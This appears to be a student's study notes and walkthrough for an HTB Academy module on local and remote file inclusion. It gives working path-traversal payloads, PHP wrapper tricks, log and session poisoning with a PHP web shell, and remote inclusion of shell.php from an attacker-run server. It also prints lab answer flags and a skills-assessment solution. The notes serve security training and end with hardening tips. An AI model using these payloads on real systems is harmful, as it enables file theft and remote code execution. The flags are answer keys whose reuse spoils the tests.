# HTB Academy Module File Inclusion/Directory Traversal 



Section 1/Introduction
----------------------

## File Inclusion


file inclusion occur when attacker include lecal and remote files,potentialy leading to source code disclosure,sensitive data exposure,and code execution under certain 
conditions.there are two types of file inclusion,namely local file inclusion(LFI) and remote file inclusion(RFI)

## LFI vs RFI


Almost any Remote File Inclusion (RFI) can also be a Local File Inclusion (LFI); however, any LFI may not be an RFI.

This is primarily because of two reasons:

    You may only control a portion of the filename and not the entire protocol wrapper (ex: http://, ftp://, https://)
    The configuration may prevent RFI all together. For example, in PHP, by setting allow_url_include to 0, it will not be possible to use remote sources within the include()
    statement.



## Where It's Common


The most common place you will find LFI Vulnerabilities is within templating engines. This is because websites want to keep a large majority of the website the same when 
navigating between pages, such as the header, navigation bar, and footer. Without dynamic page generation, every page on the server would need to be modified when changes 
are made to any of those sections. This is why you will often see a parameter like /index.php?page=about. Under the hood, index.php will probably pull header.php, about.php, 
and footer.php. Since you control the about portion of the request, it may be possible to have the webserver grab other files! Another common place is within languages.
If you see ?lang=en; then the website will grab files from the /en/ directory.



## Other Places


Template Engines are not the only place an LFI Vulnerability can be discovered. It can be found anytime the server allows a user to download a file.  For example, imagine 
if the server-side code to retrieve your avatar downloaded from /profile/$username/avatar.png. If you managed to craft a malicious username, it might be possible to change 
that file request to /profile/../../../../etc/passwd avatar.png and grab /etc/passwd instead of your avatar. Poisoning the database entry and having a separate function 
utilize that poisoned entry is called "Second Order". Developers often overlook these vulnerabilities because they are in the mindset of "Never Trust User Input". 
In this example, the retrieve avatar function is grabbing data from the database, and the developer may not realize it is actually user input.


## Local File Inclusion


File inclusion vulnerabilities can often be found in GET request parameters. Server-side scripts include certain files based on the user's choice or input, for example,
file downloads, choice of language, or website navigation.


## Basic LFI


Consider the following blog page:

`http://example.com/basic/`

The website lets users read articles in English or Spanish, selected from the language drop-down menu.

when change the language in drop-down menu observe how the page changes.

`http://example.com/basic/index.php?language=es.php`

The text contained in the card changed to desire language. Looking at the URL, we see that a parameter named language was added with the value of es.php. 
This is an indication of file inclusion based on the choice of language.

the following code is use in the server side

code: `include($_GET['language']);`

Let's try changing the filename to a world-readable file, such as /etc/passwd on Linux or C:\Windows\boot.ini on Windows.

`http://example.com/basic/index.php?language=/etc/passwd`

We can view the contents of /etc/passwd directly.

LFI with Path Traversal
=======================

Sometimes, developers specify absolute paths when including files. For example:

the server side code is this 

code: `include("./languages/" . $_GET['language']);`

The statement above includes the files present in the languages folder. Let's try including /etc/passwd once again.

`http://example.com/basic/index.php?language=/etc/passwd`

The verbose error returned shows us the string passed to the include() function, stating that there is no /etc/passwd in the languages folder. 
This restriction can be bypassed by traversing directories using a few ../ before the desired file name.

`http://example.com/basic/index.php?language=../../../../../etc/passwd`

### Another Example

Input from parameters can even be used as part of filenames. For example:

the following code is use in the server side

Php Code: `include("lang_" . $_GET['language']);`

In this scenario, input such as `../../../../../etc/passwd` will result in the final string to be `lang_../../../../../etc/passwd`, which is invalid.
Instead, prefixing a `/` before the payload will bypass the filename and traverse directories instead.

LFI with Blacklisting
=====================

Scripts can employ search and replace techniques to avoid path traversals. For example:

php code: `$language = str_replace('../', '', $_GET['language']);`

Let's try including /etc/passwd using path traversal like the previous section.

`http://example.com/basic/index.php?language=../../../../../etc/passwd`

in the output they removed all the "../" string.

All the `../` substrings were removed, which resulted in a final path of `./languages/etc/passwd`, but there is an issue with how this check was coded.
It is not removing `../` recursively, which means removing the occurrences from the string a single time. If removing `../`, creates a new instance of `../`, the new instance will not
be removed. For example, both `..././` and `....//` would become `../` after the replace function. Let's try applying this logic to include `/etc/passwd` again.

now payload looks like this

`http://example.com/basic/index.php?language=....//....//....//....//....//etc/passwd`

The inclusion was successful and we're able to view /etc/passwd again. If the defender wanted to prevent this, an example of doing this recursively would be:

php code: 
```
$lfi = "....././/..../..//filename";
while( substr_count($lfi, '../', 0)) {
 $lfi = str_replace('../', '', $lfi);
};
```

Of course, the best way to patch this is to use the `basename($_GET['language'])`, however if your application goes into a directory this could break the application.
While the above example works, it is best to try to find a native function in either your language or framework to perform the action. If you create your own function to do
this method, it is possible you are not accounting for a weird edge case. For example, in your bash terminal go into your home directly (cd ~) and run the command 
`cat .?/.*/.?/etc/passwd`. You'll see Bash allows for for the `?` and `*`wildcards to be used as a `..`

Now type php -a to enter the PHP Command Line interpreter and run `echo file_get_contents('.?/.*/.?/etc/passwd');`. You'll see PHP does not have the same behavior with
the wildcards, if you replace ? and * with ., the command will work as expected. This demonstrates there is an edge cases with our above function,
if we have PHP execute bash with the system function the attacker would be able to bypass our directory traversal prevention. If we use native functions to the framework 
we are in, there is a chance other users would catch edge cases like this and fix it before it gets exploited in our web application.


Bypass with URL Encoding
========================

On PHP versions 5.3.4 and earlier, string-based detection could be bypassed by URL encoding the payload. The characters `../` can be URL encoded into `%2e%2e%2f`,
which will bypass the filter.

In the last example `....//` can be URL encoded into `%2e%2e%2e%2e%2f%2f`.

so now the payload with url encoded look like this

payload:

```
%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2fetc%2fpasswd
```

example: 

`http://example.com/basic/index.php?language=%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2fetc%2fpasswd`

LFI with Appended Extension
===========================

Scripts can manually append a `.php` or any other required extension before including the file, which serves as mitigation against the inclusion of arbitrary files.

php code: `include($_GET['language'] . ".php");`

The files for this section are present in the LFI_extension folder. Let's try including `/etc/passwd` again.

`http://example.com/basic/index.php?language=/etc/passwd`

The result looks like this 

`http://example.com/basic/index.php?language=/etc/passwd.php`



Source Code Disclosure via PHP Wrappers
=======================================

In this scenario, our only option is to include PHP files and find sensitive information or vulnerabilities in the source code. Such files can be found by performing a brute
force against the webserver for files with a .php extension, using tools such as gobuster, dirbuster, or dirsearch. Direct inclusion of these PHP files won't return anything,
as the server will execute it as code. For example, consider a file named config.php, which is present on the server.

`http://example.com/basic/index.php?language=config`

Resut not show by this because they use this as server execute it as code

PHP provides various wrappers, which can be used for easier access to files, protocols, or streams. A list of wrappers can be found here.

`https://www.php.net/manual/en/wrappers.php.php`

The `php://` wrapper is enabled by default and interacts with IO streams. For example: `php://stdin and php://stdout` can be used to access input and output streams for the process,
while `php://input` and `php://output` are used to access request data. One handy wrapper is `php://filter`, which can be chained with multiple filters to achieve the desired output.
for example
```
php://filter/read=/resource=/etc/passwd
```
The read filter can process the input with various string operations, such as `base64` encoding, `ROT13` encoding, etc.

The following filters will convert the contents of `/etc/passwd` to `base64` and `ROT13`, respectively.

payload
```
php://filter/read=convert.base64-encode/resource=/etc/passwd
php://filter/read=string.rot13/resource=/etc/passwd
```

Let's try `base64` encoding and including the file config.php using the filter.

`http://example.com/basic/index.php?language=php://filter/read=convert.base64-encode/resource=config`

The `.php` extension is added automatically by the server. The original contents can be obtained by base64 decoding the output. The entire base64 encoded contents can be obtained 
by either sending the request in web proxy, such as Burp Suite, or using cURL.

Extension Bypass Using Null Byte
================================

PHP versions before 5.5 are vulnerable to null byte injection, meaning that adding a null byte at the end of the filename should bypass the extension check. For example: 
`language=/etc/passwd%00` will result in the statement `include("/etc/passwd%00.php")`, where the server ignores everything after the null byte.

This occurs because C and C++ consider strings to be terminated by null bytes, while PHP doesn't. The URL encoded null byte (`%00`) at the end of the filename gets `.php `appended
to it but is truncated to `/etc/passwd\x00` by the APIs written in C. This results in the inclusion of `/etc/passwd` instead of `/etc/passwd.php` when the `include()` function is called.

### HTB Academy Question&Answer

1.Using the file inclusion find the name of a user on the system that starts with "b".

A. barry

2.Submit the contents of the flag.txt file located in the /usr/share/flags directory.

A. e8cb4f6c9bc13c3b43ee4a78ced6b521


LFI to Remote Code Executionn(RCE)
==================================

LFI can lead to Remote Code Execution (RCE) under some conditions, resulting in a complete server compromise. One common way is to poison log files, which are modified based 
on requests to the webserver.

RCE through Apache / Nginx Log Files
====================================

Apache and Nginx maintain various log files such as access.log and error.log. The access.log file contains information about all requests made to the server and their 
User-Agent strings. The Nginx logs are readable by the low privilege www-data user by default, while the Apache logs are readable by root and adm users. However, these files
are readable by low privileged users in older Apache versions or cases where this has been misconfigured.

Let's go back to the basic LFI page and try including the Apache access log at `/var/log/apache2/access.log`.

`http://example.com/basic/index.php?language=/var/log/apache2`

The log contains the remote IP address, request page, response code, and the user-agent string. The User-Agent depends on the user's browser and can be edited by intercepting 
the request. Start Burp Suite, intercept a request to the page, and send it to Repeater. Next, change the User-Agent header to something else such as Apache Log Poisoning and 
click Go.

if our poisoned user agent is visible in the included log file. We can take advantage of this by setting our User-Agent to a PHP shell 
such as `<?php system($_GET['cmd']); ?>`. This gets logged into the file and gets executed by the server as PHP code on inclusion.

then We can now execute OS-level commands by adding a parameter to the GET request.

 Some other files that can be included based on the scenario are `/var/log/nginx/access.log`, `/var/log/sshd.log`, `/var/log/mail`, and `/var/log/vsftpd.log`.

On older servers, the /proc/self/environ file can be included, which can be poisoned through the User-Agent string.

RCE through PHP Session Files
=============================

Similar to server log files, PHP saves user sessions on disk. This path is dictated by the session.save_path configuration variable, which is empty by default. 
In such cases, the session files are saved to the `/var/lib/php/sessions/` folder on Linux and `C:\Windows\Temp on Windows`. The name of the session file can be identified 
from the PHPSESSID cookie. For example, if the PHPSESSID cookie is set to `el4ukv0kqbvoirg7nkp4dncpk3` then it's location on disk would be 
`/var/lib/php/sessions/sess_el4ukv0kqbvoirg7nkp4dncpk3`.

Let's visit the web main page and check if there are any cookies present.

The PHPSESSID cookie is found to be stored by the browser. As discussed earlier, the default path for this cookie should be `/var/lib/php/sessions/sess_5lu204jqpplmmjanduto9pt1mp`.
Let's include this and view its contents.

`http://example.com/basic/index.php?language=/var/lib/php/sessions/sess_{cookie here}`

We can see that the session file contains language preference and the selected page. Let's try poisoning the value of page by sending something through the language parameter. 
First, request the below URL:

`http://example.com/basic/index.php?language=session_poisoning`

This should "poison" the session file and add session_poisoning to it. Let's include the session file once again to look at the contents.

`http://example.com/index.php?language=/var/lib/php/sessions/sess_{cookie here}`

This time the session file contains session_poisoning instead of `es.php`, which confirms our ability to poison the session file. Next, let's write a PHP web shell to it using 
the following URL:

`http://example.com/index.php?language=<?php system($_GET['cmd']); ?>`

We can now include the session file and use the cmd parameter to execute operating system commands.

`http://example.com/index.php?language=/var/lib/php/sessions/sess_{cookie here}?cmd={any command here}`

**Note: To execute another command, the session file has to be poisoned with the web shell again, as it gets overwritten by ``/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd`` 
during inclusion. Also, the session ID used in the examples will differ from the one you receive from the web application, and you must change it to match yours when following 
along with the examples**.


### HTB Academy Questions:

1. Using the LFI to RCE vulnerability run the command 'cat /etc/issue'. Submit the OS version as your answer (i.e. Ubuntu 14.04.2 LTS).

A. Ubuntu 18.04.4 LTS

2. Submit the contents of the flag.txt file located in the /exercise directory.

A. 2ed328e2598271ad3d2831aa4a0c4bab

Other PHP Wrappers
==================

PHP provides some additional wrappers which can be leveraged to gain command execution.

Expect Wrapper
==============

The expect wrapper in PHP helps in interaction with process streams. This extension is disabled by default but can prove very useful if enabled. For example, the following URL 
will return the output of the id command.


`http://example.com/index.php?language=expect://id`

Data Wrapper
============

The data wrapper can be used to include external data, even PHP code. It's possible to use this only if the allow_url_include setting is enabled in the PHP configuration. 
This can be found in the file /etc/php/X.Y/apache2/php.ini for Apache and in /etc/php/X.Y/fpm/php.ini for php-fpm used by Nginx, where X.Y is your install PHP version.

First, base64 encode a PHP web shell.

Then include it using the data wrapper as shown below.


`http://example.com/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pgo=&cmd=id`

Input Wrapper
=============

Similar to the data wrapper, the input wrapper can be used to include external input and execute code. It also needs the allow_url_include setting enabled. 
The following curl command sends a POST request with a system command and then includes it using php://input, which gets executed by the page.

`curl -s -X POST --data "<?php system('id'); ?>" "http://example.com/index.php?language=php://input"`

Zip Wrapper
===========

The zip wrapper can prove useful in combination with file uploads. If the website allows uploading arbitrary files, an attacker can upload a malicious zip 
file and include PHP code. This wrapper isn't enabled by default and can be installed with the command below:

`apt install phpX.Y-zip`

***X.Y is the php version*** 

Follow the steps below to create a malicious archive.
```
1. echo '<?php system($_GET['cmd']); ?>' > exec.php

2. zip malicious.zip exec.php

3. rm exec.php
```
Next, copy malicious.zip to the webroot to simulate the upload. The files in the zip archive can be referenced using the `#` symbol, which should be URL-encoded 
in the request. For example, the URL below can be used to include exec.php and then execute code using the cmd parameter.

`http://example.com/index.php?language=zip://maliciouse.zip%23exec.php&cmd=id`

in the example above `#` is encoded to `%23` to prevent the browser from recognizing it as a fragment.

### HTB Academy Questions

1. Gain command execution using one of the PHP wrappers discussed in this section. Submit the contents of the flag.txt file located in the /secrets directory.

A. 62eb4f8836329caec43389971b683ec8

Remote File Inclusion
=====================

As the name suggests, Remote File Inclusion or RFI occurs when a website allows the inclusion of remotely hosted files. The impact of this vulnerability can be low or
high, depending on the server's configuration.

To include a remote file in PHP, the allow_url_fopen setting (enabled by default) and allow_url_include setting have to be turned on. Start a python HTTP server on 
port 8080 on localhost and then pass a URL to it through the language parameter.

`http://example.com/index.php?language=http://localhost:8080/file`

If the server tried including the file at `http://localhost:8080/file` but failed. Looking at the HTTP server, a request was logged.

```
python3 -m http.server 8080

Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/ )
127.0.0.1 - - [03/Jan/2020 07:15:50] code 404, message File not found
127.0.0.1 - - [03/Jan/2020 07:15:50] "GET /file HTTP/1.0" 404 -
```

Let's try including a web shell from our server and executing commands. First, create a file named shell.php with the following contents:

`php code: <?php system($_GET['cmd']); ?>`

`http://example.com/index.php?language=http://localhost:8080/shell.php&cmd-id`

if the file was included, and then we can executed id successfully. In case the server appends the .php extension automatically, we can omit the .php at the end.

Similar to the HTTP protocol, even the FTP protocol can be used to access remote files. Python's pyftpdlib library can be used to test this locally.

```
 python -m pyftpdlib -p 21

[I 2020-01-03 07:36:00] >>> starting FTP server on 0.0.0.0:21, pid=23686 <<<

[I 2020-01-03 07:36:00] concurrency model: async
[I 2020-01-03 07:36:00] masquerade (NAT) address: None
[I 2020-01-03 07:36:00] passive ports: None
```
Next, use the `ftp://` scheme to access `shell.php` present in the FTP root.

`http://example.com/index.php?language=ftp://localhost/shell.php&cmd-id`

By default, PHP tries to authenticate as an anonymous user. If the server needs authentication, then the credentials can be specified in the following way:

`http://example.com//index.php?language=ftp://user:pass@localhost/shell.php&cmd=id`

Windows
=======

When the application is running on Windows, the restrictions applied by allow_url_include can be bypassed by using the SMB protocol. This is because Windows treats files
on remote SMB servers as normal files, which can be referenced directly with a UNC path. We can spin up an SMB server using Impacket's smbserver.py, which allows 
anonymous authentication by default.

```
 smbserver.py -smb2support share $(pwd)

Impacket v0.9.22.dev1+20200520.120526.3f1e7ddd - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed


```

And then execute shell.php as follows:

`http://example.com/index.php?language=\\{IP here}\shere\shell.php&cmd=id`


HTB Academy Questions:
======================

1. Attack the target, gain command execution by exploiting the RFI vulnerability, and submit the contents of the flag.txt file located in the /exercise directory.

A. 99a8fc05f033f2fc0cf9a6f9826f83f4

Hardening Tips
==============

=> create a deny list and allow list for checking maliciouse thing 

=> creating mailing service for when malicious thing happend they mail to the defender

=> nerver display error messages to the website

=> block that function that cause problems like system(),passthru(),shell_exec(),popen(),proc_open(), curl_exec(), curl_multi_exec(), parse_ini_file(), show_source() etc.

=> block web application to load files from remote location.

=> jail the web application to prevent it to access non-web related files.that is done by using docker or in set language to access file from base location in php hat can
be done by adding open_basedir = /var/www in the php.ini file

=> use web application firewall(WAF) to harden the web application for attacks.

### HTB Academy Question

1. What is the full path to the php.ini file for Apache?

A. /etc/php/7.4/apache2/php.ini

2. Edit the php.ini file to block system(), then try to execute PHP Code that uses system. Read the /var/log/apache2/error.log file and fill in the blank: system() has been 
disabled for ________ reasons.

A. security


Section 4/Skills Assessment-File Inclusion/Directory Traversal Part
----------------------------------------------------

Q: Assess the web application and use a variety of techniques to gain remote code execution and find a flag in the / root directory of the file system.
Submit the contents of the flag as your answer.

A: a9a892dbc9faf9a014f58e007721835e

# Solution

## Findings:

### Directory Scanning Result:
```
images/
css/
js/
fonts/
assets/
```
monstly from this are forbiden


### Web Enumeration 

__Whatweb tool Results
```
Bootstrap, Country[RUSSIAN FEDERATION][RU], HTML5, HTTPServer[nginx/1.18.0],
JQuery[3.3.1], 
PHP[7.3.22], 
Script, Title[InlaneFreight], 
X-Powered-By[PHP/7.3.22], nginx[1.18.0]
```

totel Hidden Directories/files found 
```
contact                 [Status: 200, Size: 7036, Words: 1569, Lines: 195]
about                   [Status: 200, Size: 14635, Words: 3194, Lines: 331]
main                    [Status: 200, Size: 15829, Words: 3435, Lines: 401]
index                   [Status: 200, Size: 0, Words: 1, Lines: 1]
industries              [Status: 200, Size: 12404, Words: 2814, Lines: 314]
error        
```

Working payloads
================
After Try all the possible attack vector found the following working payload that will give us a furture information.
```
ip:port/index.php?page=php://filter/read=convert.base64-encode/resource=index
```
this is the payload that we use to convert the index.php file into base64 so we can decode base64 string to get the source code of the index.php.
**note the server add .php extension automatic so you dont have give him that**

After decoding the base64 code of source file now we have the backend source code. There we can see all the backend code used and also there we can see a comment that might be a admin panal or admin directory.

`ilf_admin/index.php`
After search this directory into the browser with the following format
`http://IP:Port/ilf_admin/index.php`
we found out that this is a admin panal. There we see diffrent directory when we click on it we see from url that they might be a attack vector for LFI.
Like the following payload


```
ip:port/ilf_admin/index.php?log=../../../../../etc/passwd
```
After checking the above reference code we found out that admin panal page have vulnerbility and we can read the local files content.
So now we do the other thing to get RCE 

There is some log file location we know from the module that might useable to get rce 

```
http://ip:port/ilf_admin/index.php?log=../../../../../var/log/nginx/error.log

http://ip:port/ilf_admin/index.php?log=../../../../../var/log/nginx/access.log
```

This is nginx log file so we can try poision it to get RCE  

We can use burp suit to intercept the request and change the `User-Agent` header to something we can to check if they show all our input to the log file. They do but they also change our payload into URL encoded. They will not work try `access.log` file with the same method.

As `error.log` file don't useable to get RCE because they change your php code in url encoding so they are useless but `access.log` is useable as we can change the user agent value  by intercepting the request with burp and change it with php code so we can execute command from there

***Note: In access.log you can't see the php code because they php you poision in the log files now compile as a backend php code***
So now you inject you php code in the log file now try to launch a system command with following syntax.

```
http://ip:port/ilf_admin/index.php?log=../../../../../var/log/nginx/access.log&cmd={any command you want to execute}
```
Example: 
`
http://ip:port/ilf_admin/index.php?log=../../../../../var/log/nginx/access.log&cmd=id
`
**Note thay will show you the result in the log file that place where your php code injected so read the log file carefully**
So Now you have the command execution on the system now use the following payload to get the `flag.txt` file content from the root directory(`/`).

Payload: `http://ip:port/ilf_admin/index.php?log=../../../../../var/log/nginx/access.log&cmd=cat /flag.txt
`
